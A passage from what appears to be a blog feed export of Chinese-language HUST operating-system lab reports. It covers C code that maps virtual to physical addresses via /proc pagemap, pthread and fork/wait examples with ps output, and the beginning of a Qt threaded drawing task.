class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 逻辑与上面相同，只是pid和vaddr是参数</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">printPhysicalAddressForProcess</span><span class="params">(<span class="type">pid_t</span> pid, <span class="type">unsigned</span> <span class="type">long</span> vaddr)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> pageSize = getpagesize();</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> v_pageIndex = vaddr / pageSize;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> v_offset = v_pageIndex * <span class="keyword">sizeof</span>(<span class="type">uint64_t</span>);</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> page_offset = vaddr % pageSize;</span><br><span class="line">    <span class="type">uint64_t</span> item = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> pagemap_file[<span class="number">256</span>];</span><br><span class="line">    <span class="built_in">sprintf</span>(pagemap_file, <span class="string">&quot;/proc/%d/pagemap&quot;</span>, pid);</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> fd = open(pagemap_file, O_RDONLY);</span><br><span class="line">    <span class="keyword">if</span> (fd == <span class="number">-1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        perror(<span class="string">&quot;打开pagemap时出错&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    lseek(fd, v_offset, SEEK_SET);</span><br><span class="line">    <span class="keyword">if</span> (read(fd, &amp;item, <span class="keyword">sizeof</span>(<span class="type">uint64_t</span>)) != <span class="keyword">sizeof</span>(<span class="type">uint64_t</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        perror(<span class="string">&quot;读取pagemap时出错&quot;</span>);</span><br><span class="line">        close(fd);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">uint64_t</span> phy_pageIndex = (((<span class="type">uint64_t</span>)<span class="number">1</span> &lt;&lt; <span class="number">55</span>) - <span class="number">1</span>) &amp; item;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> paddr = (phy_pageIndex * pageSize) + page_offset;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;pid = %d, 虚拟地址 = 0x%lx, 页面编号 = %lu, 物理地址 = 0x%lx, 物理页面帧编号 = %lu\n&quot;</span>,</span><br><span class="line">           pid, vaddr, v_pageIndex, paddr, phy_pageIndex);</span><br><span class="line">    close(fd);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (argc != <span class="number">3</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;用法：%s &lt;pid&gt; &lt;虚拟地址&gt;\n&quot;</span>, argv[<span class="number">0</span>]);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">pid_t</span> pid = atoi(argv[<span class="number">1</span>]);</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> vaddr = strtoul(argv[<span class="number">2</span>], <span class="literal">NULL</span>, <span class="number">16</span>);</span><br><span class="line"></span><br><span class="line">    printPhysicalAddressForProcess(pid, vaddr);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>test.c是一个测试程序，用于验证不同进程的共享库是否具有相同的物理地址。例如，这个程序中的printf函数在<strong>libc.so</strong>共享库中。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;PID: %d, printf的虚拟地址: %p\n&quot;</span>, getpid(), (<span class="type">void</span> *)<span class="built_in">printf</span>);</span><br><span class="line">    sleep(<span class="number">1000</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="程序执行结果-2">程序执行结果</h3><blockquote><p>必须以sudo运行，否则该文件无权限打开</p></blockquote><h4 id="program.c">program.c</h4><figure><imgsrc="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/3-4-program1.png"alt="program.c执行结果" /><figcaption aria-hidden="true">program.c执行结果</figcaption></figure><h4 id="va2pa.c-test.c">va2pa.c &amp;&amp; test.c</h4><p>启动两个测试进程，分别输出printf函数的虚拟地址。va2pa.c计算两个进程的printf函数虚拟地址对应的物理地址。</p><figure><imgsrc="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/3-4-va2pa.png"alt="va2pa.c程序执行结果" /><figcaption aria-hidden="true">va2pa.c程序执行结果</figcaption></figure><p>两个红框右侧打印了当前运行测试程序的pid和printf函数的虚拟地址，然后使用进程号和虚拟地址作为参数调用va2pa.c计算物理地址。结果显示在左侧两个框中。两个进程的printf函数虚拟地址对应的物理地址（用蓝色高亮标记）是相同的，证明不同进程的共享库具有相同的物理地址。</p>]]></content>
      
      
      <categories>
          
          <category> HUST 实验报告 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Study Notes </tag>
            
            <tag> Course Experiments </tag>
            
            <tag> Operating System </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HUST Operating System Lab2: Process&amp;Thread Synchronization Mechanisms and Application Programming</title>
      <link href="/zh/2023/11/29/HUST-Labs/HUST%20Operating%20System%20Lab2:%20Process&amp;Thread%20Synchronization%20Mechanisms%20and%20Application%20Programming/"/>
      <url>/zh/2023/11/29/HUST-Labs/HUST%20Operating%20System%20Lab2:%20Process&amp;Thread%20Synchronization%20Mechanisms%20and%20Application%20Programming/</url>
      
        <content type="html"><![CDATA[<h1 id="操作系统实验2">操作系统实验2</h1><h2 id="实验目标">实验目标</h2><ol type="1"><li>理解进程/线程的概念及应用编程过程；</li><li>理解进程/线程的同步机制及应用编程；</li><li>掌握并推广国内操作系统（推荐银河麒麟或Ubuntu Kylin）</li></ol><h2 id="实验内容">实验内容</h2><ol type="1"><li>在Linux/Windows中创建2个线程A和B，循环输出数据或字符串。</li><li>在Linux中创建（fork）一个子进程，实验wait/exit函数。</li><li>使用线程在Windows/Linux中实现圆形和方形的并发绘制。</li><li>使用线程在Windows或Linux中实现“生产者-消费者”同步控制。</li><li>使用信号机制（signal）在Linux中实现进程间通信。</li><li>在Windows或Linux中模拟哲学家就餐，提供死锁和非死锁解决方案。</li><li>学习Linux内核并使用printk调试进程创建和调度策略相关信息。</li></ol><h2id="任务1在linuxwindows中创建2个线程a和b循环输出数据或字符串">任务1：在Linux/Windows中创建2个线程A和B，循环输出数据或字符串</h2><p>要求：</p><ol type="1"><li><p>使用pthread线程库或CreateThread函数。</p></li><li><p>线程A按升序输出1-1000；线程B按降序输出1000-1。为了避免输出过快，每0.2秒输出一个数字（可调）。</p></li><li><p>输出数据时，同时输出“A”或“B”以指示哪个线程在输出，并注意格式化输出信息。例如：</p><p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">A:1000</span><br><span class="line">A:0999</span><br><span class="line">B:0001</span><br><span class="line">A:0998</span><br><span class="line">B:0002</span><br></pre></td></tr></table></figure></p></li></ol><h3 id="编写代码并编译">编写代码并编译</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 线程A函数 - 升序输出</span></span><br><span class="line"><span class="type">void</span>* <span class="title function_">print_numbers_ascending</span><span class="params">(<span class="type">void</span>* arg)</span> &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= <span class="number">1000</span>; i++) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;A:%04d\n&quot;</span>, i);</span><br><span class="line">        usleep(<span class="number">200000</span>); <span class="comment">// 暂停0.2秒</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 线程B函数 - 降序输出</span></span><br><span class="line"><span class="type">void</span>* <span class="title function_">print_numbers_descending</span><span class="params">(<span class="type">void</span>* arg)</span> &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1000</span>; i &gt;= <span class="number">1</span>; i--) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;B:%04d\n&quot;</span>, i);</span><br><span class="line">        usleep(<span class="number">200000</span>); <span class="comment">// 暂停0.2秒</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">pthread_t</span> threadA, threadB;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 创建线程</span></span><br><span class="line">    pthread_create(&amp;threadA, <span class="literal">NULL</span>, print_numbers_ascending, <span class="literal">NULL</span>);</span><br><span class="line">    pthread_create(&amp;threadB, <span class="literal">NULL</span>, print_numbers_descending, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 等待线程结束</span></span><br><span class="line">    pthread_join(threadA, <span class="literal">NULL</span>);</span><br><span class="line">    pthread_join(threadB, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* pthread_create函数：创建一个线程</span></span><br><span class="line"><span class="comment"> * 函数原型 int pthread_create(pthread_t *thread, const pthread_attr_t *attr, void *(*start_routine) (void *), void *arg);</span></span><br><span class="line"><span class="comment"> * pthread_t *thread：指向pthread_t类型变量的指针，pthread_t通常用于标识线程。函数执行成功后，该变量将被赋值为新创建线程的标识符。</span></span><br><span class="line"><span class="comment"> * const pthread_attr_t *attr：指向pthread_attr_t结构的指针，用于设置线程属性。如果传入NULL，则使用默认属性。</span></span><br><span class="line"><span class="comment"> * void *(*start_routine) (void *)：指向新线程将要执行的函数的指针。该函数必须接受一个void *类型的参数并返回一个void *类型的值。</span></span><br><span class="line"><span class="comment"> * void *arg：传递给start_routine函数的参数。这可以是指向任何类型的指针，具体取决于你的需求。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* pthread_join函数：等待线程终止</span></span><br><span class="line"><span class="comment"> * 函数原型 int pthread_join(pthread_t thread, void **retval);</span></span><br><span class="line"><span class="comment"> * pthread_t thread：要等待的线程标识符。这是创建线程时pthread_create函数返回的标识符。</span></span><br><span class="line"><span class="comment"> * void **retval：如果不为NULL，指向一个位置，用于存储线程返回的退出状态。如果线程通过pthread_exit退出，retval将包含传递给pthread_exit的值。如果线程通过返回（即线程启动例程返回）退出，retval将包含返回值。</span></span><br><span class="line"><span class="comment"> */</span></span><br></pre></td></tr></table></figure><p>pthread_create函数的详细解释：</p><figure><imgsrc="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/pthread_create.png"alt="pthread_create函数详细解释" /><figcaption aria-hidden="true">pthread_create函数详细解释</figcaption></figure><p>使用命令<code>gcc -o mission1 mission1.c -lpthread</code>编译文件并执行。</p><h3 id="查看执行过程中的进程运行状态">查看执行过程中的进程运行状态</h3><p>查看进程或线程的常用命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">ps -ef | grep [进程名称] <span class="comment"># 查看特定名称的进程信息</span></span><br><span class="line">lixiang     4874    3403  0 11:11 pts/1    00:00:00 ./mission1</span><br><span class="line">lixiang     4883    3455  0 11:12 pts/2    00:00:00 grep --color=auto mission1</span><br><span class="line"></span><br><span class="line">ps -T -p [进程PID] <span class="comment"># 查看特定PID的进程信息（-T显示其线程）</span></span><br><span class="line">PID    SPID    TTY       TIME       CMD</span><br><span class="line">4874   4874   pts/1    00:00:00   mission1</span><br><span class="line">4874   4875   pts/1    00:00:00   mission1</span><br><span class="line">4874   4876   pts/1    00:00:00   mission1</span><br><span class="line"></span><br><span class="line">ps -Tfl -p [进程PID] <span class="comment"># 更详细地显示特定PID的进程信息（包括CPU利用率等）</span></span><br><span class="line">F S UID          PID    SPID    PPID  C PRI  NI ADDR SZ WCHAN  STIME TTY          TIME CMD</span><br><span class="line">0 S lixiang     4945    4945    3403  0  80   0 - 21144 futex_ 11:17 pts/1    00:00:00 ./mission1</span><br><span class="line">1 S lixiang     4945    4946    3403  0  80   0 - 21144 hrtime 11:17 pts/1    00:00:00 ./mission1</span><br><span class="line">1 S lixiang     4945    4947    3403  0  80   0 - 21144 hrtime 11:17 pts/1    00:00:00 ./mission1</span><br><span class="line"></span><br><span class="line"><span class="comment"># 以下是常用参数的介绍：</span></span><br><span class="line">-e: 显示所有进程，而不仅仅是当前用户的进程。</span><br><span class="line">-f: 显示完整的进程信息，包括父进程ID、CPU利用率等。</span><br><span class="line">-l: 以长格式显示进程信息，包括进程状态、PID、终端、CPU利用率等。</span><br><span class="line">-u user: 显示指定用户的进程信息。</span><br><span class="line">-p pid: 显示指定PID的进程信息。</span><br><span class="line">-s: 按进程启动时间排序输出。</span><br><span class="line">-r: 按进程CPU利用率排序输出。</span><br><span class="line">-T: 显示线程</span><br></pre></td></tr></table></figure><p>运行mission1后，使用ps命令显示其详细信息。</p><figure><imgsrc="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/pid_spid.png"alt="mission1进程的详细信息" /><figcaption aria-hidden="true">mission1进程的详细信息</figcaption></figure><p>在图中，SPID表示线程ID号，3852和3852是我们创建的A和B线程。</p><h3 id="程序执行结果">程序执行结果</h3><figure><imgsrc="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/result.png"alt="执行结果" /><figcaption aria-hidden="true">执行结果</figcaption></figure><p>参考资料：</p><p><ahref="https://blog.csdn.net/qq_44824574/article/details/110672780">Linux- 线程创建</a></p><p><ahref="https://blog.csdn.net/qq_37037348/article/details/131491031#:~:text=%E6%A6%82%E5%BF%B5%E5%92%8C%E5%8E%9F%E7%90%86%201%20ps%E5%91%BD%E4%BB%A4%E9%80%9A%E8%BF%87%E8%AF%BB%E5%8F%96%2Fproc%E7%9B%AE%E5%BD%95%E4%B8%8B%E7%9A%84%E8%BF%9B%E7%A8%8B%E4%BF%A1%E6%81%AF%E6%96%87%E4%BB%B6%E8%8E%B7%E5%8F%96%E8%BF%9B%E7%A8%8B%E7%9A%84%E8%AF%A6%E7%BB%86%E4%BF%A1%E6%81%AF%E3%80%82,2%20%E8%BF%9B%E7%A8%8B%E4%BF%A1%E6%81%AF%E6%96%87%E4%BB%B6%E4%B8%8A%E5%8C%85%E5%90%AB%E4%BA%86%E8%BF%9B%E7%A8%8B%E7%9A%84PID%E3%80%81%E7%8A%B6%E6%80%81%E3%80%81%E7%88%B6%E8%BF%9B%E7%A8%8BID%E3%80%81CPU%E5%88%A9%E7%94%A8%E7%8E%87%E3%80%81%E5%86%85%E5%AD%98%E5%8D%A0%E7%94%A8%E7%AD%89%E4%BF%A1%E6%81%AF%E3%80%82%203%20ps%E5%91%BD%E4%BB%A4%E8%A7%A3%E6%9E%90%E8%BF%9B%E7%A8%8B%E4%BF%A1%E6%81%AF%E6%96%87%E4%BB%B6%E5%B9%B6%E6%A0%BC%E5%BC%8F%E5%8C%96%E8%BE%93%E5%87%BA%EF%BC%8C%E4%BB%A5%E4%BE%BF%E7%94%A8%E6%88%B7%E6%9F%A5%E7%9C%8B%E3%80%82">ps命令介绍</a></p><p><a href="https://www.linuxcool.com/ps">完整ps命令手册</a></p><h2id="任务2在linux中创建fork一个子进程实验waitexit函数">任务2：在Linux中创建（fork）一个子进程，实验wait/exit函数</h2><p>要求：</p><ol type="1"><li>效果1：父进程不使用wait函数，让父进程在子进程之前结束，子进程进入无限循环或长期循环，观察父子进程的进程ID和父进程ID。<ol type="1"><li>在程序中使用printf输出每个进程的进程号和父进程号。注意，父进程和子进程的输出应提供相应的提示字符串以便区分，以下同。</li><li>同时使用ps命令显示进程列表，观察指定进程的进程ID和父进程ID，并解释这些ID是否与printf输出的一致。</li></ol></li><li>效果2：父进程使用wait函数。子进程睡眠5秒，父进程不睡眠。子进程使用exit返回参数。父进程printf子进程返回的参数。</li></ol><h3 id="效果一">效果一</h3><p>本任务的核心是让父进程在子进程之前结束，观察进程ID的变化。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">pid_t</span> pid = fork();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (pid == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// 子进程</span></span><br><span class="line">        <span class="comment">// 子进程进入无限循环</span></span><br><span class="line">        <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;子进程输出：子进程PID：%d，父进程PID：%d\n&quot;</span>, getpid(), getppid());</span><br><span class="line">            sleep(<span class="number">5</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (pid &gt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// 父进程</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;父进程输出：父进程PID：%d，子进程PID：%d\n&quot;</span>, getpid(), pid);</span><br><span class="line">        sleep(<span class="number">20</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// fork失败</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;创建子进程失败\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>程序执行结果如下：</p><figure><imgsrc="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/2-program1_run.png"alt="程序执行结果" /><figcaption aria-hidden="true">程序执行结果</figcaption></figure><p>父进程PID=3604，子进程PID=3605，然后在父进程结束后20秒，子进程打印自己的PID和父进程PID。在父进程结束的20秒内，子进程打印父进程PID=3604，但在父进程结束后，子进程继续运行，此时父进程ID变为1。造成这种效果的原因是：</p><figure><imgsrc="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/2-program1-explain.png"alt="父进程结束后子进程的父进程ID变为1的原因" /><figcaptionaria-hidden="true">父进程结束后子进程的父进程ID变为1的原因</figcaption></figure><h3 id="效果二">效果二</h3><p>子进程在父进程之前结束，并使用exit返回一个值，父进程打印这个状态值。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">pid_t</span> pid = fork();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (pid == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// 子进程</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;子进程输出：子进程PID：%d，父进程PID：%d\n&quot;</span>, getpid(), getppid());</span><br><span class="line">        sleep(<span class="number">5</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">42</span>); <span class="comment">// 使用exit返回状态值42</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (pid &gt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// 父进程</span></span><br><span class="line">        <span class="type">int</span> status;</span><br><span class="line">        wait(&amp;status); <span class="comment">// 等待子进程结束</span></span><br><span class="line">        <span class="keyword">if</span> (WIFEXITED(status))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;子进程退出状态：%d\n&quot;</span>, WEXITSTATUS(status));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// fork失败</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;创建子进程失败\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>程序执行结果如下：</p><figure><imgsrc="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/2-program2_run.png"alt="程序执行结果" /><figcaption aria-hidden="true">程序执行结果</figcaption></figure><p>在代码中，子进程exit(42)，父进程打印退出状态码42。</p><p><ahref="https://blog.csdn.net/qq_43412060/article/details/105442802">【Linux】——进程创建fork()详细解释</a></p><h2id="任务3使用线程实现windowslinux中的圆形和方形的并发绘制">任务3：使用线程实现Windows/Linux中的圆形和方形的并发绘制</h2><p>对于这个任务，我使用Qt6实现了一个双线程的GUI界面，用于绘制圆形和方形。这里我只解释核心代码部分：</p><p>由于Qt的<strong>绘图操作只能在主线程中完成</strong>，因此我们用于绘制圆形和方形的两个线程分别用于计算圆形和方形的坐标点，并将其传递给主线程，由主线程完成相应的绘图操作。</p><p>项目文件目录如下：</p><figure><imgsrc="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/3-directory.png"alt="项目文件目录" /><figcaption aria-hidden="true">项目文件目录</figcaption></figure><p>首先，Qt需要在MainWindow类中重写paintEvent以绘制图形：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">MainWindow::paintEvent</span><span class="params">(QPaintEvent *event)</span> </span>&#123;</span><br><span class="line">    <span class="function">QPainter <span class="title">painter</span><span class="params">(<span class="keyword">this</span>)</span></span>;</span><br><span class="line">    painter.<span class="built_in">setPen</span>(Qt::blue);</span><br><span class="line">    <span class="comment">// 绘制所有圆形点</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">const</span> QPoint &amp;pt : circlePoints) &#123;</span><br><span class="line">        painter.<span class="built_in">drawPoint</span>(pt);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 连接点以绘制圆形（可选）</span></span><br><span class="line">    <span class="keyword">if</span> (circlePoints.<span class="built_in">size</span>() &gt; <span class="number">1</span>) &#123;</span><br><span class="line">        painter.<span class="built_in">setPen</span>(Qt::red);</span><br><span class="line">        painter.<span class="built_in">drawPolyline</span>(circlePoints.<span class="built_in">constData</span>(), circlePoints.<span class="built_in">size</span>());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 绘制所有方形点</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">const</span> QPoint &amp;pt : squarePoints) &#123;</span><br><span class="line">        painter.<span class="built_in">drawPoint</span>(pt);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 连接点以绘制方形（可选）</span></span><br><span class="line">    <span class="keyword">if</span> (squarePoints.<span class="built_in">size</span>() &gt; <span class="number">1</span>) &#123;</span><br><span class="line">        painter.<span class="built_in">setPen</span>(Qt::blue);</span><br><span class="line">        painter.<span class="built_in">drawPolyline</span>(squarePoints.<span class="built_in">constData</span>(), squarePoints.<span class="built_in">size</span>());</span><br><span class="line">    &#125;</span><br><span 